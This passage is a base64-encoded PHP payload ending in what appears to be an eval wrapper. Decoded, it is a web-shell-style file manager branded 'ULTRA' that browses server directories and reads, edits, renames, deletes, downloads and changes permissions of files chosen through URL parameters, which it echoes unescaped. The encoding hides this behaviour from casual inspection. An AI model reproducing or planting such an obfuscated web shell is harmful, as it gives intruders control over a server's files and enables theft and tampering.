NsYXNzPSJmb3JtLWxhYmVsIj48Pz0gJF9HRVRbJ2l0ZW0nXSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBpZD0iQ29weUZyb21UZXh0QXJlYSIgbmFtZT0ibmV3Q29udGVudCIgcm93cz0iMTAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iZm9ybS1jb250cm9sIj48Pz0gaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkcGF0aCAuICcvJyAuICRfR0VUWydpdGVtJ10pKSA/PjwvdGV4dGFyZWE+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQiPlN1Ym1pdDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IiBvbmNsaWNrPSJqc2NvcHkoKSI+Q29weQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IiBvbmNsaWNrPSJoaXN0b3J5LmdvKC0xKSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZWlmICgkYWN0aW9uID09ICdjaG1vZCcgJiYgaXNzZXQoJF9HRVRbJ2l0ZW0nXSkpIDogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJuYW1lIiBjbGFzcz0iZm9ybS1sYWJlbCI+PD89ICRfR0VUWydpdGVtJ10gPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0ibmV3UGVybSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPSI8Pz0gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRfR0VUWydpdGVtJ10pKSwgLTQpOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQiPlN1Ym1pdDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IiBvbmNsaWNrPSJoaXN0b3J5LmdvKC0xKSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InRhYmxlLXJlc3BvbnNpdmUiPg0KICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtaG92ZXIgdGFibGUtZGFyayB0ZXh0LWxpZ2h0Ij4NCiAgICAgICAgICAgICAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9IndpZHRoOjM1JSI+TmFtZTwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9IndpZHRoOjExJSI+VHlwZTwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9IndpZHRoOjExJSI+U2l6ZTwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9IndpZHRoOjExJSI+T3duZXIvR3JvdXA8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJ3aWR0aDoxMSUiPlBlcm1pc3Npb248L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJ3aWR0aDoxMSUiPkxhc3QgTW9kaWZpZWQ8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJ3aWR0aDoxMCUiPkFjdGlvbnM8L3RkPg0KICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPg0KICAgICAgICAgICAgICAgICAgICA8dGJvZHkgY2xhc3M9InRleHQtbm93cmFwIj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGRpcnMgYXMgJGRpcikgOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFpc19kaXIoJGRpcikpIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkZGlyID09PSAnLi4nKSA6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/PSBkaXJuYW1lKCRwYXRoKTsgPz4iIGNsYXNzPSJ0ZXh0LWRlY29yYXRpb24tbm9uZSB0ZXh0LWxpZ2h0Ij48aQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImZhIGZhLWZvbGRlci1vcGVuIj48L2k+IDw/PSAkZGlyID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlaWYgKCRkaXIgPT09ICcuJykgOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2Rpcj08Pz0gJHBhdGg7ID8+IiBjbGFzcz0idGV4dC1kZWNvcmF0aW9uLW5vbmUgdGV4dC1saWdodCI+PGkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJmYSBmYS1mb2xkZXItb3BlbiI+PC9pPiA8Pz0gJGRpciA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZSA6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/PSAkcGF0aCAuICcvJyAuICRkaXIgPz4iIGNsYXNzPSJ0ZXh0LWRlY29yYXRpb24tbm9uZSB0ZXh0LWxpZ2h0Ij48aQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImZhIGZhLWZvbGRlciI+PC9pPiA8Pz0gJGRpciA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQiPjw/PSBmaWxldHlwZSgkZGlyKSA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0Ij4tPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQiPjw/PSBnZXRPd25lcigkZGlyKSA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGEgaHJlZj0iP2Rpcj0nIC4gJHBhdGggLiAnJml0ZW09JyAuICRkaXIgLiAnJmFjdGlvbj1jaG1vZCI+JzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX3dyaXRhYmxlKCRwYXRoIC4gJy8nIC4gJGRpcikpIGVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCFpc19yZWFkYWJsZSgkcGF0aCAuICcvJyAuICRkaXIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHBlcm1zKCRwYXRoIC4gJy8nIC4gJGRpcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc193cml0YWJsZSgkcGF0aCAuICcvJyAuICRkaXIpIHx8ICFpc19yZWFkYWJsZSgkcGF0aCAuICcvJyAuICRkaXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPC9hPic7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQiPjw/PSBkYXRlKCJZLW0tZCBoOmk6cyIsIGZpbGVtdGltZSgkZGlyKSk7ID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkZGlyICE9ICcuJyAmJiAkZGlyICE9ICcuLicpIDogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2Rpcj08Pz0gJHBhdGggPz4maXRlbT08Pz0gJGRpciA/PiZhY3Rpb249cmVuYW1lIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQgYnRuLXNtIG1yLTEiIGRhdGEtdG9nZ2xlPSJ0b29sdGlwIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iUmVuYW1lIj48aSBjbGFzcz0iZmEgZmEtZWRpdCI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSBtci0xIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9uY2xpY2s9InJldHVybiBkZWxldGVDb25maXJtKCc/ZGlyPTw/PSAkcGF0aCA/PiZpdGVtPTw/PSAkZGlyID8+JmFjdGlvbj1kZWxldGUnKSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLXRvZ2dsZT0idG9vbHRpcCIgZGF0YS1wbGFjZW1lbnQ9ImF1dG8iIHRpdGxlPSJEZWxldGUiPjxpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImZhIGZhLXRyYXNoIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVsc2VpZiAoJGRpciA9PT0gJy4nKSA6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tZ3JvdXAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgaHJlZj0iI25ld0ZvbGRlckNvbGxhcHNlIiByb2xlPSJidXR0b24iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtY29udHJvbHM9Im5ld0ZvbGRlckNvbGxhcHNlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQgYnRuLXNtIG1yLTEiIGRhdGEtdG9nZ2xlPSJ0b29sdGlwIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iTmV3IEZvbGRlciI+PGkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iZmEgZmEtZm9sZGVyLXBsdXMiPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBocmVmPSIjbmV3RmlsZUNvbGxhcHNlIiByb2xlPSJidXR0b24iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtY29udHJvbHM9Im5ld0ZpbGVDb2xsYXBzZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSBtci0xIiBkYXRhLXRvZ2dsZT0idG9vbHRpcCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLXBsYWNlbWVudD0iYXV0byIgdGl0bGU9Ik5ldyBGaWxlIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1wbHVzIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkZGlycyBhcyAkZGlyKSA6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWlzX2ZpbGUoJGRpcikpIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD89ICRwYXRoID8+Jml0ZW09PD89ICRkaXIgPz4mYWN0aW9uPWVkaXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJ0ZXh0LWRlY29yYXRpb24tbm9uZSB0ZXh0LWxpZ2h0Ij48aSBjbGFzcz0iZmEgZmEtZmlsZS1jb2RlIj48L2k+IDw/PSAkZGlyID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCI+PD89IChmdW5jdGlvbl9leGlzdHMoJ21pbWVfY29udGVudF90eXBlJykgPyBtaW1lX2NvbnRlbnRfdHlwZSgkZGlyKSA6IGZpbGV0eXBlKCRkaXIpKSA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0Ij48Pz0gZnNpemUoJGRpcikgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCI+PD89IGdldE93bmVyKCRkaXIpID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICc8YSBocmVmPSI/ZGlyPScgLiAkcGF0aCAuICcmaXRlbT0nIC4gJGRpciAuICcmYWN0aW9uPWNobW9kIj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNfd3JpdGFibGUoJHBhdGggLiAnLycgLiAkZGlyKSkgZWNobyAnPGZvbnQgY29sb3I9ImxpbWUiPic7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoIWlzX3JlYWRhYmxlKCRwYXRoIC4gJy8nIC4gJGRpcikpIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPic7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gcGVybXMoJHBhdGggLiAnLycgLiAkZGlyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX3dyaXRhYmxlKCRwYXRoIC4gJy8nIC4gJGRpcikgfHwgIWlzX3JlYWRhYmxlKCRwYXRoIC4gJy8nIC4gJGRpcikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICc8L2E+JzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCI+PD89IGRhdGUoIlktbS1kIGg6aTpzIiwgZmlsZW10aW1lKCRkaXIpKTsgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLWdyb3VwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD89ICRwYXRoID8+Jml0ZW09PD89ICRkaXIgPz4mYWN0aW9uPWVkaXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSBtci0xIiBkYXRhLXRvZ2dsZT0idG9vbHRpcCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iRWRpdCI+PGkgY2xhc3M9ImZhIGZhLWZpbGUtZWRpdCI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD89ICRwYXRoID8+Jml0ZW09PD89ICRkaXIgPz4mYWN0aW9uPXJlbmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQgYnRuLXNtIG1yLTEiIGRhdGEtdG9nZ2xlPSJ0b29sdGlwIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS1wbGFjZW1lbnQ9ImF1dG8iIHRpdGxlPSJSZW5hbWUiPjxpIGNsYXNzPSJmYSBmYS1lZGl0Ij48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2Rpcj08Pz0gJHBhdGggPz4maXRlbT08Pz0gJGRpciA/PiZhY3Rpb249ZG93bmxvYWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSBtci0xIiBkYXRhLXRvZ2dsZT0idG9vbHRpcCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iRG93bmxvYWQiPjxpIGNsYXNzPSJmYSBmYS1maWxlLWRvd25sb2FkIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCBidG4tc20gbXItMSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9uY2xpY2s9InJldHVybiBkZWxldGVDb25maXJtKCc/ZGlyPTw/PSAkcGF0aCA/PiZpdGVtPTw/PSAkZGlyID8+JmFjdGlvbj1kZWxldGUnKSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEtdG9nZ2xlPSJ0b29sdGlwIiBkYXRhLXBsYWNlbWVudD0iYXV0byIgdGl0bGU9IkRlbGV0ZSI+PGkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJmYSBmYS10cmFzaCI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7ID8+DQogICAgICAgICAgICAgICAgICAgIDwvdGJvZHk+DQogICAgICAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGNlbnRlcj4NCiAgICAgICAgICAgICAgICA8aHIgd2lkdGg9JzUwJSc+DQogICAgICAgICAgICAgICAgQ29weXJpZ2h0ICYjMTY5OyBVTFRSQQ0KICAgICAgICAgICAgPC9jZW50ZXI+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KPC9kaXY+DQoNCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIg0KICAgICAgICBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIg0KICAgICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL3N3ZWV0YWxlcnQyQDExLjQuMC9kaXN0L3N3ZWV0YWxlcnQyLmFsbC5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdD4NCg0KICAgIDw/cGhwIGlmIChpc3NldCgkX1NFU1NJT05bJ21lc3NhZ2UnXSkpIDogPz4NCiAgICBTd2FsLmZpcmUoDQogICAgICAgICc8Pz0gJF9TRVNTSU9OWydzdGF0dXMnXSA/PicsDQogICAgICAgICc8Pz0gJF9TRVNTSU9OWydtZXNzYWdlJ10gPz4nLA0KICAgICAgICAnPD89ICRfU0VTU0lPTlsnY2xhc3MnXSA/PicNCiAgICApDQogICAgPD9waHAgZW5kaWY7IGNsZWFyKCk7ID8+DQoNCiAgICBmdW5jdGlvbiBkZWxldGVDb25maXJtKHVybCkgew0KICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpDQogICAgICAgIFN3YWwuZmlyZSh7DQogICAgICAgICAgICB0aXRsZTogJ0FyZSB5b3Ugc3VyZT8nLA0KICAgICAgICAgICAgaWNvbjogJ3dhcm5pbmcnLA0KICAgICAgICAgICAgc2hvd0NhbmNlbEJ1dHRvbjogdHJ1ZSwNCiAgICAgICAgICAgIGNvbmZpcm1CdXR0b25Db2xvcjogJyMzMDg1ZDYnLA0KICAgICAgICAgICAgY2FuY2VsQnV0dG9uQ29sb3I6ICcjZDMzJywNCiAgICAgICAgICAgIGNvbmZpcm1CdXR0b25UZXh0OiAnWWVzLCBkZWxldGUgaXQhJw0KICAgICAgICB9KS50aGVuKChyZXN1bHQpID0+IHsNCiAgICAgICAgICAgIGlmIChyZXN1bHQuaXNDb25maXJtZWQpIHsNCiAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IHVybA0KICAgICAgICAgICAgfQ0KICAgICAgICB9KQ0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIGpzY29weSgpIHsNCiAgICAgICAgdmFyIGpzQ29weSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJDb3B5RnJvbVRleHRBcmVhIik7DQogICAgICAgIGpzQ29weS5mb2N1cygpOw0KICAgICAgICBqc0NvcHkuc2VsZWN0KCk7DQogICAgICAgIGRvY3VtZW50LmV4ZWNDb21tYW5kKCJjb3B5Iik7DQogICAgfQ0KDQo8L3NjcmlwdD4NCjwvYm9keT4NCjwvaHRtbD4=")); ?>
